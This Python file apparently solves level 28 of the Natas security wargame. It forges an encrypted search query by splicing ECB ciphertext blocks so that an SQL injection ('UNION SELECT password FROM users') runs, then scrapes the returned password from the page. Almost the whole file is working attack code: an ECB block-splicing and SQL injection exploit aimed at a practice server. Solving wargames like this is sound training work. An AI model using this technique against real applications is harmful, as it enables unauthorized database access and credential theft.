import re
import base64
import urllib.parse
from .base_solver import NatasSolver

class Natas28Solver(NatasSolver):
    def __init__(self, level: int, password: str):
        super().__init__(level, password)
        self.block_size = 16

    def make_injection_payload(self) -> str:
        try:
            # Create SQL injection payload
            injection = "A" * 9 + "' UNION SELECT password FROM users; #"
            
            # Calculate blocks needed
            blocks = (len(injection) - 10) // self.block_size
            if (len(injection) - 10) % self.block_size != 0:
                blocks += 1

            # Get raw injection response
            inject_response = self.make_request(
                method="POST",
                data={"query": injection}
            )
            raw_inject = base64.b64decode(urllib.parse.unquote(inject_response.url[60:]))

            # Get good base response
            base_response = self.make_request(
                method="POST",
                data={"query": "A" * 10}
            )
            good_base = base64.b64decode(urllib.parse.unquote(base_response.url[60:]))

            # Construct query
            query = (
                good_base[:self.block_size * 3] + 
                raw_inject[self.block_size * 3:self.block_size * 3 + (blocks * self.block_size)] + 
                good_base[self.block_size * 3:]
            )

            # Encode final payload
            return urllib.parse.quote(base64.b64encode(query)).replace('/', '%2F')

        except Exception as e:
            print(f"[!] Failed to create injection payload: {str(e)}")
            raise

    def solve(self) -> str:
        try:
            # Generate SQL injection payload
            payload = self.make_injection_payload()
            
            # Make request with payload
            response = self.make_request(
                f"/search.php/?query={payload}"
            )
            
            # Extract password from response
            match = re.findall(r'<li>(.*)</li>', response.text)
            if not match:
                print(f"[!] Response text: {response.text}")
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas28: {str(e)}")








